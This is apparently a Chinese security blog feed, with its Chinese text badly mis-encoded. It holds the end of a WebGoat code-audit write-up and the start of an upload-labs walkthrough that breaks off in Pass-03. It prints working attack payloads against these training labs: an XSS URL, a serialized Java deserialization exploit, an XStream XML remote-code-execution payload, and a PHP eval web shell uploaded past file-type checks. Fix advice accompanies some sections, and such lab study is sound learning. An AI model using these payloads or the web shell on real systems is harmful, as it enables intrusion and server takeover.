ä¸­çš„å†…éƒ¨åŠŸèƒ½</p><p><img src="xss01.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// something like ... http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere%3Cscript%3Ewebgoat.customjs.phoneHome();%3C%2Fscript%3E--andMoreGarbageHere// or http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&lt;script&gt;webgoat.customjs.phoneHome();&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>é€šè¿‡ url è§¦å‘è·¯ç”±å†…éƒ¨å‡½æ•°çš„æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&lt;script&gt;webgoat.customjs.phoneHome();&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure><p><img src="xss03.png" alt=""></p><p>ä¿®å¤å»ºè®®ï¼šè§„èŒƒä½¿ç”¨ JavaScript</p></li></ol><h1 id="ååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#ååºåˆ—åŒ–">#</a> ååºåˆ—åŒ–</h1><p>ååºåˆ—åŒ–æ¼æ´å‘¢æ˜¯ä¸€ä¸ªè¯´å¤æ‚ä¹Ÿä¸å¤æ‚ï¼Œè¯´ä¸å¤æ‚ä¹Ÿå¾ˆå¤æ‚çš„é—®é¢˜ï¼Œè¦ç†è§£çš„ç‚¹è¿˜æ˜¯æœ‰å¾ˆå¤šçš„ï¼Œ<a href="https://www.cnblogs.com/ssooking/p/5875215.html">è¿™é‡Œå°±è®²çš„å¾ˆç»†</a></p><p>deserializationâ€“&gt;InsecureDeserializationTask</p><p>æ ¹æ® if (!(o instanceof VulnerableTaskHolder))ï¼Œå¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬åºåˆ—åŒ–çš„å®ä¾‹åº”è¯¥æ˜¯ VulnerableTaskHolder</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) &#123;            before = System.currentTimeMillis();            Object o = ois.readObject();            <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> VulnerableTaskHolder)) &#123;                <span class="keyword">if</span> (o <span class="keyword">instanceof</span> String) &#123;                    <span class="keyword">return</span> failed(<span class="keyword">this</span>).feedback(<span class="string">&quot;insecure-deserialization.stringobject&quot;</span>).build();                &#125;                <span class="keyword">return</span> failed(<span class="keyword">this</span>).feedback(<span class="string">&quot;insecure-deserialization.wrongobject&quot;</span>).build();            &#125;            after = System.currentTimeMillis();</span><br></pre></td></tr></table></figure><p>VulnerableTaskHolder å®šä½åˆ° Runtime.getRuntime ().exec (taskAction)</p><p>å¹¶ä¸” taskAction æ˜¯åœ¨æ„é€ å‡½æ•°é‡Œè¢«èµ‹å€¼çš„</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ taskAction æ¥æ§åˆ¶æ‰§è¡Œçš„å‘½ä»¤ï¼ˆeg. VulnerableTaskHolder go = new VulnerableTaskHolder (â€œsleepâ€, â€œsleep 6â€)ï¼‰ï¼Œå°†å¯¹è±¡ä½¿ç”¨åºåˆ—åŒ–å·¥å…·åºåˆ—åŒ–ï¼Œæäº¤è‡³åç«¯å¤„ç†ï¼Œå°±ä¼šè§¦å‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//condition is here to prevent you from destroying the goat altogetherif ((taskAction.startsWith(&quot;sleep&quot;)||taskAction.startsWith(&quot;ping&quot;))&amp;&amp; taskAction.length() &lt; 22) &#123;log.info(&quot;about to execute: &#123;&#125;&quot;, taskAction);try &#123;            Process p = Runtime.getRuntime().exec(taskAction);            BufferedReader in = new BufferedReader(                                new InputStreamReader(p.getInputStream()));            String line = null;            while ((line = in.readLine()) != null) &#123;                log.info(line);            &#125;        &#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>åºåˆ—åŒ– VulnerableTaskHolder å¯¹è±¡ï¼Œbase64 ç¼–ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;        <span class="keyword">try</span>&#123;            VulnerableTaskHolder go = <span class="keyword">new</span> VulnerableTaskHolder(<span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;sleep 6&quot;</span>);            ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);            oos.writeObject(go);            oos.flush();            <span class="keyword">byte</span>[] exploit = bos.toByteArray();            String exp = Base64.getEncoder().encodeToString(exploit);            System.out.println(exp);        &#125; <span class="keyword">catch</span> (Exception e)&#123;        &#125;</span><br></pre></td></tr></table></figure><p>æäº¤åååºåˆ—åŒ–åçš„å¯¹è±¡</p><p><img src="des01.png" alt=""></p><p>ä½†æ˜¯æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œè°·æ­Œäº†ä¸€ä¸‹ï¼Œè¯´æ˜¯ç”¨ java è°ƒç”¨ CMD å‘½ä»¤æ—¶ï¼Œéœ€è¦æŒ‡å®š ï¼Œä½†æ˜¯è¿™ä¸ªä¼šæ”¹å˜ç°å­˜ä»£ç é€»è¾‘ï¼Œæš‚æœªå®ç°ï¼Œå®ç°åå†æ›´æ–°</p><p><img src="des02.png" alt=""></p><p>ååºåˆ—åŒ–æ¼æ´ä¿®å¤å»ºè®®ï¼š</p><pre><code>1. å¦‚æœæ˜¯ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå»ºè®®æ›´æ–°ç‰ˆæœ¬æˆ–æ‰“è¡¥ä¸2. åŠ å¼ºå¯¹Runtime.execç›¸å…³ä»£ç çš„æ£€æµ‹3. æ¡ä»¶å…è®¸çš„è¯ï¼Œç¦æ­¢JVMæ‰§è¡Œå¤–éƒ¨å‘½ä»¤</code></pre><h1 id="ç¬¬ä¸‰æ–¹ç»„ä»¶"><a class="markdownIt-Anchor" href="#ç¬¬ä¸‰æ–¹ç»„ä»¶">#</a> ç¬¬ä¸‰æ–¹ç»„ä»¶</h1><h2 id="æ¼æ´æè¿°-9"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°-9">#</a> æ¼æ´æè¿°</h2><p>ç³»ç»Ÿä¸­å¼•ç”¨äº†å­˜åœ¨å·²çŸ¥æ¼æ´çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œå¦‚ Jackson ååºåˆ—åŒ–æ¼æ´ã€Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç­‰ï¼Œå¯èƒ½ä¼šç›´æ¥æˆ–é—´æ¥å¯¼è‡´ç³»ç»Ÿæ²¦é™·ã€‚</p><h2 id="ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-9"><a class="markdownIt-Anchor" href="#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-9">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2><p><a href="https://x-stream.github.io/CVE-2013-7285.html">CVE-2013-7285 æ¼æ´è¯¦æƒ…</a></p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰ˆæœ¬ä¿¡æ¯æ‰¾åˆ°ç›¸åº”çš„ cve æ¼æ´å’Œ payload è¿›è¡Œåˆ©ç”¨ï¼Œå¦‚ä¸‹å°±æ˜¯é€šè¿‡æ„é€  ContactImpl çš„ xml æ ¼å¼é€šå…³ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;        <span class="keyword">if</span> (!StringUtils.isEmpty(payload)) &#123;        payload = payload.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;&gt;&quot;</span>).replace(<span class="string">&quot; &lt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>);        &#125;            contact = (Contact) xstream.fromXML(payload);        &#125; <span class="keyword">catch</span> (Exception ex) &#123;            <span class="keyword">return</span> failed(<span class="keyword">this</span>).feedback(<span class="string">&quot;vulnerable-components.close&quot;</span>).output(ex.getMessage()).build();        &#125;                <span class="keyword">try</span> &#123;            <span class="keyword">if</span> (<span class="keyword">null</span>!=contact) &#123;            contact.getFirstName();<span class="comment">//trigger the example like https://x-stream.github.io/CVE-2013-7285.html            &#125;             if (!(contact instanceof ContactImpl)) &#123;            return success(this).feedback(&quot;vulnerable-components.success&quot;).build();            &#125;        &#125; catch (Exception e) &#123;        return success(this).feedback(&quot;vulnerable-components.success&quot;).output(e.getMessage()).build();        &#125;</span></span><br></pre></td></tr></table></figure><p>å®ä¾‹æ¡ˆä¾‹ä¸­ï¼Œå¯ä»¥é€šè¿‡æ„é€  xml æ ¼å¼çš„æ•°æ®ï¼Œé€ æˆ rce</p><p>ç¬¬ä¸‰æ–¹æ¼æ´ä¿®å¤å»ºè®®ï¼šæ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œæˆ–è€…æ‰“è¡¥ä¸</p><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sorted-set&gt;  &lt;string&gt;foo&lt;/string&gt;  &lt;dynamic-proxy&gt;    &lt;<span class="class"><span class="keyword">interface</span>&gt;<span class="title">java</span>.<span class="title">lang</span>.<span class="title">Comparable</span>&lt;/<span class="title">interface</span>&gt;    &lt;<span class="title">handler</span> <span class="title">class</span></span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;      &lt;target <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;        &lt;command&gt;          &lt;string&gt;cacl.exe&lt;/string&gt;        &lt;/command&gt;      &lt;/target&gt;      &lt;action&gt;start&lt;/action&gt;    &lt;/handler&gt;  &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="301.png" alt=""></p><h1 id="csrf"><a class="markdownIt-Anchor" href="#csrf">#</a> CSRF</h1><h2 id="æ¼æ´æè¿°-10"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°-10">#</a> æ¼æ´æè¿°</h2><p>CSRFï¼ˆCross-site request forgeryï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¹Ÿè¢«ç§°ä¸º â€œOne Click Attackâ€ æˆ–è€… Session Ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRFï¼Œæ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ã€‚å°½ç®¡å¬èµ·æ¥åƒè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰ï¼Œä½†å®ƒä¸ XSS éå¸¸ä¸åŒï¼ŒXSS åˆ©ç”¨ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œè€Œ CSRF åˆ™é€šè¿‡ä¼ªè£…æ¥è‡ªå—ä¿¡ä»»ç”¨æˆ·çš„è¯·æ±‚æ¥åˆ©ç”¨å—ä¿¡ä»»çš„ç½‘ç«™ã€‚ä¸ XSS æ”»å‡»ç›¸æ¯”ï¼ŒCSRF æ”»å‡»å¾€å¾€ä¸å¤§æµè¡Œï¼ˆå› æ­¤å¯¹å…¶è¿›è¡Œé˜²èŒƒçš„èµ„æºä¹Ÿç›¸å½“ç¨€å°‘ï¼‰å’Œéš¾ä»¥é˜²èŒƒï¼Œæ‰€ä»¥è¢«è®¤ä¸ºæ¯” XSS æ›´å…·å±é™©æ€§ã€‚</p><h2 id="æ¼æ´æˆå› -9"><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› -9">#</a> æ¼æ´æˆå› </h2><p>ç½‘ç«™çš„ cookie åœ¨æµè§ˆå™¨ä¸­ä¸ä¼šè¿‡æœŸï¼Œåªè¦ä¸å…³é—­æµè§ˆå™¨æˆ–è€…é€€å‡ºç™»å½•ï¼Œé‚£ä»¥ååªè¦æ˜¯è®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œéƒ½ä¼šé»˜è®¤ä½ å·²ç»ç™»å½•çš„çŠ¶æ€ã€‚è€Œåœ¨è¿™ä¸ªæœŸé—´ï¼Œæ”»å‡»è€…å‘é€äº†æ„é€ å¥½çš„ csrf è„šæœ¬æˆ–åŒ…å« csrf è„šæœ¬çš„é“¾æ¥ï¼Œå¯èƒ½ä¼šæ‰§è¡Œä¸€äº›ç”¨æˆ·ä¸æƒ³åšçš„åŠŸèƒ½</p><h2 id="éƒ¨åˆ†ä»£ç åŠä¿®å¤å»ºè®®"><a class="markdownIt-Anchor" href="#éƒ¨åˆ†ä»£ç åŠä¿®å¤å»ºè®®">#</a> éƒ¨åˆ†ä»£ç åŠä¿®å¤å»ºè®®</h2><ol><li><p>csrfâ€“&gt;ForgedReviews.createNewReview()</p><p>åªåˆ¤æ–­äº† refer å€¼</p><p><img src="csrf1.png" alt=""></p><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>bp ä¸€é”®ç”Ÿæˆ</p><p><img src="csrf01.png" alt=""></p><p><img src="csrf02.png" alt=""></p><p>ä¿®å¤å»ºè®®ï¼š</p><ol><li><p>åœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆéšæœº tokenï¼Œæµè§ˆå™¨åœ¨å‘èµ·é’ˆå¯¹æ•°æ®çš„ä¿®æ”¹è¯·æ±‚å°† token æäº¤ï¼Œç”±æœåŠ¡å™¨ç«¯éªŒè¯é€šè¿‡å¤Ÿè¿›è¡Œæ“ä½œé€»è¾‘ï¼Œtoken éœ€è¦è‡³å¤šä¸€æ¬¡æœ‰æ•ˆï¼Œå¹¶å…·æœ‰æœ‰é™çš„ç”Ÿå‘½å‘¨æœŸ</p></li><li><p>é€šè¿‡æ£€æŸ¥ refer å€¼ï¼Œåˆ¤æ–­è¯·æ±‚æ˜¯å¦åˆæ³• (ä¸‹é¢çš„ä»£ç å°±æ˜¯å…¸å‹çš„åä¾‹)</p></li><li><p>é’ˆå¯¹éœ€è¦ç”¨æˆ·æˆæƒçš„è¯·æ±‚ï¼Œæç¤ºç”¨æˆ·è¾“å…¥èº«ä»½è®¤è¯åå†ç»§ç»­æ“ä½œ</p></li><li><p>é’ˆå¯¹é¢‘ç¹æ“ä½œæç¤ºè¾“å…¥éªŒè¯ç åå†ç»§ç»­è¿›è¡Œæ“ä½œ</p></li></ol></li><li><p>csrfâ€“&gt;CSRFFeedbackï¼ˆ7ï¼‰</p><p>æ–°å¢åˆ¤æ–­äº† contentTypeã€‚</p><p>æ‹¦æˆªè¯·æ±‚åŒ…ç”Ÿæˆçš„ poc ä¸­ï¼Œenctype=â€œtext/plainâ€ï¼Œæˆ‘ä»¬è¦å‘é€çš„ json æ ¼å¼çš„æ•°æ®éƒ½è¢«éšè—åœ¨ input çš„ name ä¸­ï¼Œå…¶ä½™åŒä¸Š</p><p><img src="csrf2.png" alt=""></p><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="csrf03.png" alt=""></p></li></ol><h1 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf">#</a> SSRF</h1><h2 id="æ¼æ´æè¿°-11"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°-11">#</a> æ¼æ´æè¿°</h2><p>æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼ˆSSRFï¼‰ä¹Ÿæˆä¸ºè·¨ç«™ç‚¹ç«¯å£æ”»å‡»ï¼Œæ˜¯ç”±äºä¸€äº›åº”ç”¨åœ¨ 9 å‘ç¬¬ä¸‰æ–¹ä¸»æœºè¯·æ±‚èµ„æºæ—¶æä¾›äº† URL å¹¶é€šè¿‡ä¼ é€’çš„ URL æ¥è·å–èµ„æºå¼•èµ·çš„ï¼Œå½“è¿™ç§åŠŸèƒ½æ²¡æœ‰å¯¹åè®®ã€ç½‘ç»œå¯ä¿¡ä¾¿æ·åšå¥½é™åˆ¶æ—¶ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¿™ç§ç¼ºé™·æ¥è·å–å†…ç½‘æ•æ„Ÿæ•°æ®ã€DOS å†…ç½‘æœåŠ¡å™¨ã€è¯»æ–‡ä»¶ç”šè‡³äºå¯è·å–å†…ç½‘æœåŠ¡å™¨æ§åˆ¶æƒé™ç­‰ã€‚</p><h2 id="æ¼æ´æˆå› -10"><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› -10">#</a> æ¼æ´æˆå› </h2><p>æœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤æˆ–è€…é™åˆ¶ï¼Œæ¯”å¦‚è¯´ä»æŒ‡å®š url åœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œæ–‡æ¡£ç­‰ç­‰.</p><h2 id="ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-10"><a class="markdownIt-Anchor" href="#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-10">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2><p>ä¸¤ä¸ªä»»åŠ¡éƒ½æ˜¯æ ¹æ®ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼Œè¿›è¡Œåˆ¤æ–­è¾“å…¥ï¼Œå¹¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤</p><p><img src="ssrf1.png" alt=""></p><p><img src="ssrf2.png" alt=""></p><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="ssrf3.png" alt=""></p><p><img src="ssrf4.png" alt=""></p><p>ä¿®å¤å»ºè®®ï¼š</p><ol><li><p>ç¦ç”¨ä¸éœ€è¦çš„åè®®ã€‚ä»…ä»…å…è®¸ http å’Œ https è¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ file://,gopher://,<a href="ftp://%E7%AD%89%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98">ftp:// ç­‰å¼•èµ·çš„é—®é¢˜</a></p></li><li><p>ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé˜²æ­¢åˆ©ç”¨é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€.</p></li><li><p>ç¦æ­¢ 302 è·³è½¬ï¼Œæˆ–æ¯è·³è½¬ä¸€æ¬¡æ£€æŸ¥æ–°çš„ host æ˜¯å¦ä¸ºå†…ç½‘ ip, åç¦æ­¢</p></li><li><p>è®¾ç½® url åå•æˆ–è€…é™åˆ¶å†…ç½‘ ip.</p></li></ol><hr><h1 id="æœ€åæƒ³è¯´çš„"><a class="markdownIt-Anchor" href="#æœ€åæƒ³è¯´çš„">#</a> æœ€åæƒ³è¯´çš„</h1><p>è¦å¥½å¥½åŠªåŠ›ï¼Œè·Ÿç€è‡ªå·±çš„èŠ‚å¥ï¼Œä¼šè¶Šæ¥è¶Šå¥½çš„ o (ï¿£Îµï¿£*)</p><p>è¿˜æœ‰è¿˜æœ‰ï¼Œè°¢è°¢å°ç”œç”œä¸€ç›´çš„é™ªä¼´ï¼Œçˆ±æ‚¨â™¡</p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webgoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labsåŸºç¡€å…³å¡</title>
      <link href="/2020/11/25/dmx/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/"/>
      <url>/2020/11/25/dmx/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="pass-01"><a class="markdownIt-Anchor" href="#pass-01">#</a> Pass-01</h1><h2 id="è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹">#</a> è¿‡ç¨‹</h2><p>ç¬¬ä¸€å…³ï¼Œé€šå¸¸éšä¾¿ä¼ æŠŠå“ˆå“ˆå“ˆ</p><p>æ¥ä¸ª php ä¸€å¥è¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hqxx&#x27;</span>]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å“¦è±ï¼Œå¼¹çª—æç¤ºäº†ï¼šè¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ .jpg|.png|.gif ç±»å‹çš„æ–‡ä»¶ï¼Œå½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š.php</p><p>å¼¹çª—æç¤ºï¼Œæ²¡æœ‰å‘è¯·æ±‚åŒ…ï¼Œè¯´æ˜æ˜¯å‰ç«¯éªŒè¯äº†ï¼Œé‚£å°±å»æ‰¾ js éªŒè¯ä»£ç ï¼Œå¹²æ‰ä»–</p><p><img src="upload-labs-01-01.png" alt=""></p><p>æ–¹æ³• 1ï¼šCtrl+F æ‰¾å“ªä¸ªæ ‡ç­¾ç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œåˆ æ‰å®ƒï¼Œç„¶åç‚¹å‡»ä¸Šä¼ </p><p><img src="upload-labs-01-02.png" alt=""></p><p>æ–¹æ³• 2ï¼šå¤åˆ¶ checkFile å‡½æ•°ï¼Œå°†.php ç±»å‹åŠ è¿›ç™½åå•ï¼Œåœ¨æ§åˆ¶å°è¾“å…¥è¿è¡Œåç‚¹å‡»ä¸Šä¼ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class="line">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span><br><span class="line">    var allow_ext = &quot;.jpg|.png|.gif|.php&quot;;</span><br><span class="line">    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span><br><span class="line">    if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åé€šè¿‡æŸ¥çœ‹å™¨å¾—åˆ°æ–‡ä»¶è·¯å¾„</p><p><img src="upload-labs-01-03.png" alt=""></p><p>ä¸Šèœåˆ€</p><p>èœåˆ€æ²¡ä¸Šå»ï¼Œä¸Šèšå‰‘</p><p><img src="upload-labs-01-04.png" alt=""></p><p><img src="upload-labs-01-05.png" alt=""></p><h2 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“">#</a> æ€»ç»“</h2><p>åœ¨æ§å°è¿è¡Œå‡½æ•°çš„æ–¹æ³•ï¼Œæˆ‘è¿˜æ˜¯ä¸€ä¸ªæœˆä¹‹å‰æ‰çŸ¥é“çš„ï¼ˆåˆ«è¯´ deï¼‰ï¼Œæ˜æ˜å¾ˆå®¹æ˜“æƒ³åˆ°æˆ–è€…å°è¯•åˆ°çš„ç‚¹â€¦</p><p>æ„Ÿè§‰è¿˜æ˜¯è¦è„‘æ´å¤§ä¸€ç‚¹ï¼Œå¤šå°è¯•ä¸€äº›</p><h1 id="pass-02"><a class="markdownIt-Anchor" href="#pass-02">#</a> Pass-02</h1><p>dateï¼š2020-11-25 22:01:47</p><h2 id="è¿‡ç¨‹-2"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-2">#</a> è¿‡ç¨‹</h2><p>é€šè¿‡æŸ¥çœ‹å™¨ï¼Œæ‰¾åˆ°å‰ç«¯çš„ onsubmit äº‹ä»¶ï¼Œä½†æ˜¯åˆ é™¤åï¼Œè¿˜æ˜¯åˆ¤å®šæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®</p><p><img src="upload-labs-02-01.png" alt=""></p><p>å¹¶æ²¡æœ‰åœ¨å‰ç«¯çœ‹è§ js ä»£ç ï¼Œåº”è¯¥æ˜¯åå°åˆ¤æ–­äº†</p><p>çœ‹ä¸€ä¸‹æç¤ºï¼šæœ¬ pass åœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„ MIME è¿›è¡Œæ£€æŸ¥ï¼</p><p>ä¸Šä¼ æ–‡ä»¶ï¼Œbp æŠ“åŒ…ï¼Œæ›´æ”¹ MIME ç±»å‹ä¸º image/pngï¼ŒåŒæ—¶å¾—åˆ°è·¯å¾„</p><p><img src="upload-labs-02-02.png" alt=""></p><p>ä¸Šèšå‰‘è¿æ¥å³å¯ã€‚</p><h2 id="æ€»ç»“-2"><a class="markdownIt-Anchor" href="#æ€»ç»“-2">#</a> æ€»ç»“</h2><p>çœŸç™¾åº¦äº†å¥½å¤šæ¬¡äº†ï¼Œæ¯æ¬¡éƒ½å¿˜è®°</p><p>â€œMIME çš„å…¨ç§°æ˜¯ Multipurpose Internet Mail Extensions, å³å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚ è¿™æ˜¯ HTTP åè®®ä¸­ç”¨æ¥å®šä¹‰æ–‡æ¡£æ€§è´¨åŠæ ¼å¼çš„æ ‡å‡†ã€‚</p><table><thead><tr><th>æ–‡ä»¶ç±»å‹</th><th>åç¼€</th><th>æ•°æ®åŒ…ä¸­çš„æ–‡ä»¶ç±»å‹</th></tr></thead><tbody><tr><td>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬</td><td>.html</td><td>text/html</td></tr><tr><td>xml æ–‡æ¡£</td><td>.xml</td><td>text/xml</td></tr><tr><td>æ™®é€šæ–‡æœ¬æ–‡æ¡£</td><td>.text</td><td>text/plain</td></tr><tr><td>RTF æ–‡æœ¬</td><td>.rtf</td><td>application/rtf</td></tr><tr><td>PDF æ–‡æ¡£</td><td>.pdf</td><td>application/pdf</td></tr><tr><td>Miscrosoft Word æ–‡ä»¶</td><td>.word</td><td>application/msword</td></tr><tr><td>PNG å›¾åƒ</td><td>.png</td><td>image/png</td></tr><tr><td>GIF å›¾å½¢</td><td>.gif</td><td>image/gif</td></tr><tr><td>JPEG å›¾å½¢</td><td>.jpeg,.jpg</td><td>image/jpeg</td></tr><tr><td>ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ®</td><td></td><td>application/octet-stream</td></tr></tbody></table><h1 id="pass-03"><a class="markdownIt-Anchor" href="#pass-03">#</a> Pass-03</h1><p>dateï¼š2020-11-25 22:53:30</p><h2 id="è¿‡ç¨‹-3"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-3">#</a> è¿‡ç¨‹</h2><p>ä¸åºŸè¯ç›´æ¥ä¼  php ä¸Šçˆ†ç ´æŠ“åŒ…ï¼Œsend to repeater</p><p><img src="upload-labs-02-03.png" alt=""></p><p>æ ¹æ®ä¸Šä¼  php 